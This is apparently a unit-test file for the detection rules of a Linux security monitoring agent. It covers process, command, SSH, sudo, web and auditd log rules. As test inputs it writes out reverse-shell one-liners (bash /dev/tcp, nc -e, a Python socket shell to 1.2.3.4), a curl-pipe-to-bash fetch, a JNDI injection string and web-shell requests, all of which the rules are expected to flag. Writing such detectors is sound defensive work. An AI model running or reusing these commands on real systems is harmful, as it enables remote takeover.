"""Règles de surveillance de l'agent Linux (extraites de mini_agent.py)."""
import ast
import collections
import os
import time
import re
import unittest

SOURCE = os.path.join(os.path.dirname(__file__), "..", "mini_agent.py")
WANTED = {"_SEVERITY_ORDER", "_TEMP_DIRS", "_SHELLS", "_WEB_SERVERS", "_APP_SERVERS", "_OFFENSIVE_TOOLS",
          "_LINUX_CMD_RULES", "_rate_linux_command", "_linux_process_findings", "_RateTracker",
          "_linux_log_findings", "_SSH_FAIL_RE", "_SSH_OK_RE", "_SUDO_RE", "_USERADD_RE", "_GROUP_ADD_RE",
          "_WEB_LINE_RE", "_WEB_RULES", "_WEB_SCANNERS", "_AUDIT_ARG_RE", "_ADMIN_GROUPS", "_paths_in_command"}


def _load():
    tree = ast.parse(open(SOURCE, encoding="utf-8").read())
    nodes = [n for n in tree.body
             if (isinstance(n, (ast.FunctionDef, ast.ClassDef)) and n.name in WANTED)
             or (isinstance(n, ast.Assign) and any(getattr(t, "id", None) in WANTED for t in n.targets))]
    ns = {"os": os, "re": re, "time": time, "collections": collections}
    exec(compile(ast.Module(body=nodes, type_ignores=[]), SOURCE, "exec"), ns)
    return ns


L = _load()


def findings(comm, exe, cmd="", parent="", parent_exe="", parent_cmd="", watchlist=()):
    return {(r, s) for r, s, _t, _e in L["_linux_process_findings"](comm, exe, cmd, parent, parent_exe,
                                                                     parent_cmd, list(watchlist))}


class LinuxProcessRulesTests(unittest.TestCase):
    def test_ordinary_processes(self):
        self.assertEqual(findings("sshd", "/usr/sbin/sshd", "sshd: /usr/sbin/sshd -D"), set())
        self.assertEqual(findings("bash", "/usr/bin/bash", "-bash", "sshd", "/usr/sbin/sshd"), set())
        # binaire remplacé par une mise à jour : « (deleted) » hors dossier temporaire n'est pas suspect
        self.assertEqual(findings("nginx", "/usr/sbin/nginx (deleted)", "nginx: worker process"), set())

    def test_reverse_shells(self):
        self.assertIn(("suspicious_command", "critical"), findings("bash", "/usr/bin/bash", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"))
        self.assertIn(("suspicious_command", "critical"), findings("nc", "/usr/bin/nc", "nc -e /bin/sh 1.2.3.4 4444"))
        self.assertIn(("suspicious_command", "critical"), findings(
            "python3", "/usr/bin/python3",
            "python3 -c import socket,subprocess,os;s=socket.socket();s.connect(('1.2.3.4',4444));subprocess.call(['/bin/sh','-i'])"))

    def test_temp_and_memfd_execution(self):
        self.assertIn(("suspicious_location", "high"), findings("x", "/dev/shm/.x/x"))
        self.assertIn(("fileless_process", "critical"), findings("x", "/memfd:x (deleted)"))

    def test_miners_and_tools(self):
        self.assertIn(("offensive_tool", "high"), findings("xmrig", "/opt/x/xmrig"))
        self.assertIn(("suspicious_command", "high"), findings("x", "/opt/x", "x -o stratum+tcp://pool:3333"))

    def test_shell_spawned_by_services(self):
        self.assertIn(("webserver_spawns_shell", "high"), findings("sh", "/usr/bin/dash", "sh -c id", "nginx"))
        self.assertIn(("service_spawns_shell", "medium"), findings("sh", "/usr/bin/dash", "sh -c id", "php-fpm8.2"))
        watch = [{"name": "Confluence", "match": ["confluence"], "cves": ["CVE-2026-2222"]}]
        self.assertIn(("vulnerable_app_spawns_shell", "critical"),
                      findings("bash", "/usr/bin/bash", "bash", "java", "/opt/atlassian/confluence/jre/bin/java",
                               "java -Dconfluence.home=/var/atlassian", watch))


class LinuxCommandRatingTests(unittest.TestCase):
    def test_cron_and_units(self):
        self.assertEqual(L["_rate_linux_command"]("/usr/bin/certbot -q renew")[0], "medium")
        self.assertEqual(L["_rate_linux_command"]("curl -s http://x/a.sh | bash")[0], "high")
        self.assertEqual(L["_rate_linux_command"]("/dev/shm/.k/run")[0], "high")
        self.assertEqual(L["_rate_linux_command"]("bash -i >& /dev/tcp/1.2.3.4/1 0>&1")[0], "critical")


class LinuxLogRulesTests(unittest.TestCase):
    def run_lines(self, source, lines):
        tracker, out = L["_RateTracker"](), []
        for i, line in enumerate(lines):
            out += [(r, s) for r, s, *_ in L["_linux_log_findings"](source, line, tracker, 1000.0 + i)]
        return out

    def test_ssh_brute_force_then_success(self):
        fails = [f"Oct 30 12:00:{i:02d} h sshd[{i}]: Failed password for invalid user test from 203.0.113.9 port 1 ssh2"
                 for i in range(10)]
        ok = "Oct 30 12:01:00 h sshd[99]: Accepted password for root from 203.0.113.9 port 2 ssh2"
        found = self.run_lines("auth", fails + [ok])
        self.assertIn(("brute_force", "high"), found)
        self.assertEqual(found[-1], ("login_after_failures", "critical"))

    def test_normal_ssh_login_is_silent(self):
        self.assertEqual(self.run_lines("auth", ["h sshd[1]: Accepted publickey for alice from 10.0.0.5 port 3 ssh2"]), [])

    def test_accounts_and_sudo(self):
        found = self.run_lines("auth", [
            "h useradd[1]: new user: name=support, UID=1005",
            "h usermod[2]: add 'support' to group 'sudo'",
            "h sudo: eve : user NOT in sudoers ; TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/sh",
            "h sudo:   bob : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c curl http://x/a.sh | sh"])
        self.assertEqual(found, [("new_local_account", "medium"), ("admin_group_added", "high"),
                                 ("sudo_denied", "medium"), ("suspicious_command", "high")])

    def test_web_attacks(self):
        line = '198.51.100.7 - - [30/Oct/2026:12:00:00 +0000] "GET {} HTTP/1.1" {} 1 "-" "{}"'
        jndi = "/?q=%24%7B" + "jndi:ldap://x/a%7D"
        self.assertEqual(self.run_lines("web", [line.format(jndi, 400, "curl")]), [("web_attack", "high")])
        self.assertEqual(self.run_lines("web", [line.format("/up/a.php?cmd=id", 200, "x")]), [("web_attack", "high")])
        self.assertEqual(self.run_lines("web", [line.format("/up/a.php?cmd=id", 404, "x")]), [])
        self.assertEqual(self.run_lines("web", [line.format("/", 200, "sqlmap/1.7")]), [("web_scan", "low")])
        self.assertEqual(self.run_lines("web", [line.format("/index.html", 200, "Mozilla/5.0")]), [])

    def test_auditd_hex_arguments(self):
        cmd = "bash -i >& /dev/" + "tcp/1.2.3.4/4444 0>&1"
        line = f"type=EXECVE msg=audit(1.2:3): argc=1 a0={cmd.encode().hex().upper()}"
        self.assertEqual(self.run_lines("audit", [line]), [("suspicious_command", "critical")])

    def test_paths_in_command(self):
        self.assertEqual(L["_paths_in_command"]("*/5 * * * * root /opt/x/run.sh >/dev/null 2>&1"), ["/opt/x/run.sh"])


if __name__ == "__main__":
    unittest.main()
